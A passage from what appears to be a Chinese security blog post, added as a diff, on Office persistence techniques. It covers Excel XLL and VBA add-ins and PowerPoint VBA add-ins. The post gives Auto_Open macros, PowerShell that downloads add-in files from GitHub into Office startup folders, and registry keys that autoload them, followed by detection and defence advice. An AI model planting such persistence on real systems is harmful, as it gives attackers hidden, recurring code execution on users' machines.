+    $Ver=$OfficeVersion.Substring( $OfficeVersion.LastIndexOf(&quot;e&quot;)+1 ) 
+
+}  
+Catch  
+{  
+    Write-Host &quot;[!] I can&#39;t find Microsoft Office!&quot; 
+    Write-Host &quot;[+] Please reinput a correct path.&quot; 
+    return 
+}  
+Write-Host &quot;Microsoft Office Version:&quot; $Ver
+$ExcelRegPath=&quot;HKCU:\Software\Microsoft\Office\&quot;+$Ver+&quot;.0\Excel\&quot;
+New-Item -type Directory $ExcelRegPath&quot;Options&quot; | Out-Null
+New-ItemProperty $ExcelRegPath&quot;Options&quot; OPEN -value &quot;/R calc.xll&quot; -propertyType string | Out-Null
+</code></pre><h2 id="0x04-Excel-VBA-add-ins"><a href="#0x04-Excel-VBA-add-ins" class="headerlink" title="0x04 Excel VBA add-ins"></a>0x04 Excel VBA add-ins</h2><hr>
+<h3 id="1、手动测试-2"><a href="#1、手动测试-2" class="headerlink" title="1、手动测试"></a>1、手动测试</h3><p>启动Excel，开启开发工具选项，选择Visual Basic</p>
+<p>插入模块，写入以下代码：</p>
+<pre><code>Sub Auto_Open()
+    Set objShell = CreateObject(&quot;Wscript.Shell&quot;)
+    objShell.Exec (&quot;calc.exe&quot;)
+End Sub
+</code></pre><p>保存为calc.xlam,路径为：</p>
+<p><code>%appdata%\Microsoft\Excel\XLSTART</code></p>
+<p>启动Excel.exe，弹出计算器，并且Excel正常启动</p>
+<h3 id="2、编写Powershell脚本实现-2"><a href="#2、编写Powershell脚本实现-2" class="headerlink" title="2、编写Powershell脚本实现"></a>2、编写Powershell脚本实现</h3><p>保存路径为：</p>
+<p><code>%appdata%\Microsoft\Excel\XLSTART\calc.xlam</code></p>
+<p>对应powershell代码如下：</p>
+<pre><code>$client = new-object System.Net.WebClient
+$client.DownloadFile(&quot;https://raw.githubusercontent.com/3gstudent/Office-Persistence/master/calc.xlam&quot;,$env:APPDATA+&quot;\Microsoft\Excel\XLSTART\calc.xlam&quot;)
+</code></pre><h2 id="0x05-PowerPoint-VBA-add-ins"><a href="#0x05-PowerPoint-VBA-add-ins" class="headerlink" title="0x05 PowerPoint VBA add-ins"></a>0x05 PowerPoint VBA add-ins</h2><hr>
+<h3 id="1、手动测试-3"><a href="#1、手动测试-3" class="headerlink" title="1、手动测试"></a>1、手动测试</h3><p>启动PowerPoint，开启开发工具选项，选择Visual Basic</p>
+<p>插入模块，写入以下代码：</p>
+<pre><code>Sub Auto_Open()
+    Set objShell = CreateObject(&quot;Wscript.Shell&quot;)
+    objShell.Exec (&quot;calc.exe&quot;)
+End Sub
+</code></pre><p>保存为calc.ppa，路径为：</p>
+<p><code>%appdata%\Microsoft\AddIns</code></p>
+<p>查找注册表键值：</p>
+<p>Office2010对应的键值为：</p>
+<p><code>HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\PowerPoint</code></p>
+<p>Office2013对应的键值为：</p>
+<p><code>HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\PowerPoint</code></p>
+<p>新建项AddIns，新建子项calc（对应calc.ppa）</p>
+<p>新建<code>DWORD</code>值： <code>Autoload</code>： <code>1</code></p>
+<p>新建<code>字符串</code>值： <code>Path</code>： <code>calc.ppa</code></p>
+<p>启动PowerPoint.exe，弹出计算器，并且PowerPoint正常启动</p>
+<h3 id="2、编写Powershell脚本实现-3"><a href="#2、编写Powershell脚本实现-3" class="headerlink" title="2、编写Powershell脚本实现"></a>2、编写Powershell脚本实现</h3><p>保存路径为：</p>
+<p><code>%appdata%\Microsoft\AddIns\calc.ppa</code></p>
+<p>对应powershell代码如下：</p>
+<pre><code>$client = new-object System.Net.WebClient
+$client.DownloadFile(&quot;https://raw.githubusercontent.com/3gstudent/Office-Persistence/master/calc.ppa&quot;,$env:APPDATA+&quot;\Microsoft\AddIns\calc.ppa&quot;)
+</code></pre><p>注册表路径：HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\PowerPoint\</p>
+<pre><code>Try  
+{  
+    $OfficeVersion=dir -name &quot;C:\Program Files\Microsoft Office\Office*&quot; -ErrorAction Stop  
+    $Ver=$OfficeVersion.Substring( $OfficeVersion.LastIndexOf(&quot;e&quot;)+1 )     
+}  
+Catch  
+{  
+    Write-Host &quot;[!] I can&#39;t find Microsoft Office!&quot; 
+    Write-Host &quot;[+] Please reinput a correct path.&quot; 
+    return 
+}  
+Write-Host &quot;Microsoft Office Version:&quot; $Ver
+$ExcelRegPath=&quot;HKCU:\Software\Microsoft\Office\&quot;+$Ver+&quot;.0\PowerPoint\&quot;
+</code></pre><p>新建键AddIns:</p>
+<p><code>New-Item -type Directory $ExcelRegPath&quot;AddIns&quot; | Out-Null</code></p>
+<p>新建键calc:</p>
+<p><code>New-Item -type Directory $ExcelRegPath&quot;AddIns\calc&quot; | Out-Null</code></p>
+<p>新建DWORD值： Autoload： 1</p>
+<p><code>New-ItemProperty $ExcelRegPath&quot;AddIns\calc&quot; Autoload -value &quot;1&quot; -propertyType DWORD | Out-Null</code></p>
+<p>新建字符串值： Path： calc.ppa</p>
+<p><code>New-ItemProperty $ExcelRegPath&quot;AddIns\calc&quot; Path -value &quot;calc.ppa&quot; -propertyType string | Out-Null</code></p>
+<p>完整代码如下：</p>
+<pre><code>$client = new-object System.Net.WebClient
+$client.DownloadFile(&quot;https://raw.githubusercontent.com/3gstudent/Office-Persistence/master/calc.ppa&quot;,$env:APPDATA+&quot;\Microsoft\AddIns\calc.ppa&quot;)
+
+Try  
+{  
+    $OfficeVersion=dir -name &quot;C:\Program Files\Microsoft Office\Office*&quot; -ErrorAction Stop  
+    $Ver=$OfficeVersion.Substring( $OfficeVersion.LastIndexOf(&quot;e&quot;)+1 )     
+}  
+Catch  
+{  
+    Write-Host &quot;[!] I can&#39;t find Microsoft Office!&quot; 
+    Write-Host &quot;[+] Please reinput a correct path.&quot; 
+    return 
+}  
+Write-Host &quot;Microsoft Office Version:&quot; $Ver
+$ExcelRegPath=&quot;HKCU:\Software\Microsoft\Office\&quot;+$Ver+&quot;.0\PowerPoint\&quot;
+
+New-Item -type Directory $ExcelRegPath&quot;AddIns&quot; | Out-Null
+New-Item -type Directory $ExcelRegPath&quot;AddIns\calc&quot; | Out-Null
+New-ItemProperty $ExcelRegPath&quot;AddIns\calc&quot; Autoload -value &quot;1&quot; -propertyType DWORD | Out-Null
+New-ItemProperty $ExcelRegPath&quot;AddIns\calc&quot; Path -value &quot;calc.ppa&quot; -propertyType string | Out-Null
+</code></pre><p><strong>注：</strong></p>
+<p>以上四种方法的利用脚本我已经整合并上传至github，地址为：</p>
+<p><a href="https://github.com/3gstudent/Office-Persistence" target="_blank" rel="noopener">https://github.com/3gstudent/Office-Persistence</a></p>
+<h2 id="0x06-检测和防御"><a href="#0x06-检测和防御" class="headerlink" title="0x06 检测和防御"></a>0x06 检测和防御</h2><hr>
+<h3 id="1、Word"><a href="#1、Word" class="headerlink" title="1、Word"></a>1、Word</h3><p>禁用所有加载项，如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-15/3-1.png" alt="Alt text"></p>
+<p>禁用所有控件，如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-15/3-2.png" alt="Alt text"></p>
+<p>禁用所有宏，如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-15/3-3.png" alt="Alt text"></p>
+<p>Word WLL依然能够执行</p>
+<p><strong>防御方法：</strong></p>
+<p>删除信任位置：</p>
+<p><code>C:\Users\a\AppData\Roaming\Microsoft\Word\Startup\</code></p>
+<p>如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-15/3-4.png" alt="Alt text"></p>
+<p><strong>注：</strong></p>
+<p>添加时不能使用环境变量%appdata%</p>
+<h3 id="2、Excel"><a href="#2、Excel" class="headerlink" title="2、Excel"></a>2、Excel</h3><p>Excel XLL和Excel VBA add-ins:</p>
+<p><strong>防御方法：</strong></p>
+<p>禁用所有加载项</p>
+<h3 id="3、PowerPoint"><a href="#3、PowerPoint" class="headerlink" title="3、PowerPoint"></a>3、PowerPoint</h3><p>PowerPoint VBA add-ins:</p>
+<p><strong>防御方法：</strong></p>
+<p>禁用所有加载项</p>
+<h2 id="0x07-小结"><a href="#0x07-小结" class="headerlink" title="0x07 小结"></a>0x07 小结</h2><hr>
+<p>本文介绍了x86系统下Word、Excel、PowerPoint中常用的四种后门利用方式，开源POC脚本以便于测试，最后站在防御角度，介绍了具体的防御方法。x64系统的利用方法作适当修改就好。</p>
+<hr>
+<p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>
+
+                
+<p class="red-link-context">
+    <a href="8bfd8af5.html" rel="next" title="Use Excel.Application object&#39;s RegisterXLL() method to load dll">
+    上一篇：Use Excel.Application object&#39;s RegisterXLL() method to load dll
+  </a>
+</p>
+
+
+
+<p class="red-link-context">
+    <a href="cf6f3aa.html" rel="next" title="Use msxsl to bypass AppLocker">
+    下一篇：Use msxsl to bypass AppLocker
+  </a>
+</p>
+
+
+            </div>
+			
+        </div>
+    </div>
+	
+</article>
+
+<!-- JiaThis Button BEGIN -->
+<div class="jiathis_style_32x32">
+	<a class="jiathis_button_qzone"></a>
+	<a class="jiathis_button_tsina"></a>
+	<a class="jiathis_button_tqq"></a>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_renren"></a>
+	<a href="http://www.jiathis.com/share?uid=2157721" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	<a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+var jiathis_config = {data_track_clickback:'true'};
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code_mini/jia.js?uid=2157721" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+<!-- ������City�氲װ���� -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC8zNDIxOS8xMDc1Nw==">
+	<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+	</script>
+<noscript> Ϊ����ʹ�����������۹����뼤��JavaScript</noscript>
+</div>
+<!-- City�氲װ��������� -->
+
+ 
+</div>
+
+        <div class="fixed-action-btn float-sitemap">
+    <a class="btn-floating btn-large red">
+      <i class="fa fa-caret-square-o-up"></i>
+    </a>
+    <ul>
+      <li><a class="btn-return-top btn-floating waves-effect brown" title="回到顶部"><i class="fa fa-arrow-circle-o-up"></i></a></li>
+      <li><a class="btn-floating waves-effect button-collapse indigo"  data-activates="main-menu" title="菜单"><i class="fa fa-navicon"></i></a></li>
+    </ul>	
+  </div>
+	
+    </main>
+    
+  
+
+<script type="text/javascript" src="http://imagestp.cfyqy.com/cfyqy/pet/js/jquery.min.js"></script>
+<script type="text/javascript" src="http://imagestp.cfyqy.com/cfyqy/pet/js/spig.js"></script>
+<link rel="stylesheet" href="http://imagestp.cfyqy.com/cfyqy/pet/css/spigPet.css" type="text/css"/>
+<script type="text/javascript">
+var isindex = true;
+var visitor = true;
+</script>
+<div >
+<!--小人只在首页显示 start*-->
+<div id="spig" class="spig">
+    <div id="message">正在加载中……</div>
+    <div id="mumu" class="mumu"></div>
+</div>
+</div>
+<!--小人end*-->
+ 
+<footer class="page-footer indigo darken-1 darken-1">
+	
+    <div class="footer-container container">
+        <div class="row">
+            
+            <div class="social-group col m4 s12">
+                <h5 class="white-text">社交</h5>
+                
+                    <a class="social-link" href="" target="_blank">
+                        <i class="fa fa-2x fa-weibo"></i>
+                    </a>
+                
+                    <a class="social-link" href="" target="_blank">
+                        <i class="fa fa-2x fa-github"></i>
+                    </a>
+                
+                    <a class="social-link" href="/atom.xml" target="_blank">
+                        <i class="fa fa-2x fa-rss"></i>
+                    </a>
+                
+                
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <div class="site-visitors-container white-text">
+        <span>
+            <i class="fa fa-user"></i>
+            <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+        </span>
+        <span>&nbsp;|&nbsp;</span>
+        <span>
+            <i class="fa fa-eye"></i>
+            <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+
+
+            </div>
+            
+           
+            <div class="col m8 s12">
+                <h5 class="white-text">友情链接</h5>
+                
+                    <a class="social-link" href="http://www.itxueke.com/SecNavi/#3782" target="_blank">IT学客安全导航</a>
+                
+            </div>
+            
+        </div>
+    </div>
+    
+    <div class="footer-copyright red-link-context">
+        <div class="container">
+            © just do !
+        </div>
+    </div>
+	
+</footer>
+
+	
+
+<script>(function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/APP_ID.js","daovoice");</script>
+<script>
+  daovoice('init', {
+    app_id: "45fb937d",
+  });
+  daovoice('update');
+</script>
+  <noscript>
+    <div class="noscript">
+        <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+    </div>
+</noscript>
+<div class="noscript">
+    <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+</div>
+
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/materialize.min.js"></script>
+
+<script>
+    (function($) {
+        $(document).ready(function() {
+            // 隐藏禁用javascript（针对微信内置浏览器）的提示
+            $('.noscript').hide();
+
+            // 图片缩放效果
+            var $imgs = $('img').not('.slider-image').not('.avatar-image').not('.carousel-image').not('.card-cover-image').not('.qrcode');
+
+            // 给图片加上点击放大效果（materialbox插件）
+            $imgs.addClass('materialboxed').each(function(i, el) {
+                $(this).attr('data-caption', $(this).attr('alt') || ' ');
+            }).materialbox();
+
+            // 优化表格的显示
+            $('table').each(function() {
+                var $table = $(this);
+                // 除去多行代码的情况
+                if ($table.find('pre').length == 0) {
+                    $table.addClass('responsive-table striped bordered');
+                }
+            });
+
+            // 首页幻灯片
+            $('.slider').slider({indicators: true, full_width: true, interval: 8000});
+
+            $(".button-collapse").sideNav();
+            $(".category-menu").sideNav();
+
+            // 针对gallery post
+            $('.carousel').carousel({full_width: true});
+            $('.carousel-control.prev').click(function() {
+                $('.carousel').carousel('prev');
+            });
+            $('.carousel-control.next').click(function() {
+                $('.carousel').carousel('next');
+            });
+
+            // 文章目录
+            $('article').not('.simple-article').find('h1').add('h2').add('h3').add('h4').add('h5').add('h6').scrollSpy();
+
+            // 目录随屏幕滚动（防止目录过长越过footer）
+            var $toc = $('.toc');
+            var scrollTargetTop = 0;
+            $(window).scroll(function() {
+                var $activeLink = $toc.find('a.active.section');
+                if ($(window).scrollTop() < 100) {
+                    scrollTargetTop = 0;
+                } else {
+                    if ($activeLink[0]) {
+                        scrollTargetTop = $activeLink.offset().top - $toc.offset().top;
+                    }
+                }
+                $toc.css('top', '-' + scrollTargetTop + 'px');
+            });
+
+            // 修正文章目录的left-border颜色
+            var color = $('.table-of-contents-text').css('color');
+            $('.table-of-contents-link').css('border-left-color', color);
+
+            // 针对移动端做的优化：FAB按钮点击一下收回
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                $('.fixed-action-btn').addClass('click-to-toggle');
+            }
+            // 回到顶部
+            $('.btn-return-top').click(function() {
+                $('body, html').animate({
+                    scrollTop: 0
+                }, 500);
+            });
+
+            // 重置读书页面的Tab标签页的颜色
+            $('li.tab a').hover(function() {
+                $(this).toggleClass('text-lighten-4');
+            });
+            $('.indicator').addClass(' lighten-2');
+
+            
+            // 添加new标签
+            $('.menu-reading, .menu-about').append('<span class="new badge red"></span>');
+            
+
+            // 搜索功能
+            $('.modal-trigger').leanModal({
+                // 打开搜索框时自动聚焦
+                ready: function() {
+                    if ($('#search').is(":visible")) {
+                        $('#search-input').focus();
+                    }
+                }
+            });
+            var searchXml = "search.xml";
+            if (searchXml.length == 0) {
+             	searchXml = "search.xml";
+            }
+            var searchPath = "/" + searchXml;
+            initSearch(searchPath, 'search-input', 'search-result');
+        });
+
+        // 初始化搜索与匹配函数
+        var initSearch = function(path, search_id, content_id) {
+            'use strict';
+            $.ajax({
+                url: path,
+                dataType: "xml",
+                success: function(xmlResponse) {
+                    // get the contents from search data
+                    var datas = $("entry", xmlResponse).map(function() {
+                        return {
+                            title: $("title", this).text(),
+                            content: $("content", this).text(),
+                            url: $("url", this).text()
+                        };
+                    }).get();
+                    var $input = document.getElementById(search_id);
+                    var $resultContent = document.getElementById(content_id);
+                    $input.addEventListener('input', function() {
+                        var str = '<ul class=\"search-result-list\">';
+                        var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                        $resultContent.innerHTML = "";
+                        if (this.value.trim().length <= 0) {
+                            return;
+                        }
+                        // perform local searching
+                        datas.forEach(function(data) {
+                            var isMatch = true;
+                            var content_index = [];
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty titles and contents
+                            if (data_title != '' && data_content != '') {
+                                keywords.forEach(function(keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            }
+                            // show search results
+                            if (isMatch) {
+                                keywords.forEach(function(keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    data_title = data_title.replace(regS, "<span class=\"search-keyword red lighten-2\">" + keyword + "</span>");
+                                });
+
+                                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 100 characters
+                                    var start = first_occur - 20;
+                                    var end = first_occur + 80;
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+                                    if (start == 0) {
+                                        end = 100;
+                                    }
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+                                    var match_content = content.substring(start, end);
+                                    // highlight all keywords
+                                    keywords.forEach(function(keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, "<span class=\"search-keyword red lighten-2\">" + keyword + "</span>");
+                                    });
+
+                                    str += "<p class=\"search-result\">..." + match_content + "...</p>"
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        $resultContent.innerHTML = str;
+                    });
+                }
+            });
+        }
+    })(jQuery);
+</script>
+
+
+<script src="/js/prettify.js"></script>
+<script type="text/javascript">
+    $(document).ready(function() {
+        $("pre").addClass("prettyprint");
+        prettyPrint();
+    });
+</script>
+
+
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', '119424621', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+
+
+<script type="text/javascript" src="http://tajs.qq.com/stats?sId=65311650" charset="UTF-8"></script>
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+});
+</script>
+<script type="text/javascript" async
+  src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https'){
+   bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+	
+</body>
+</html>
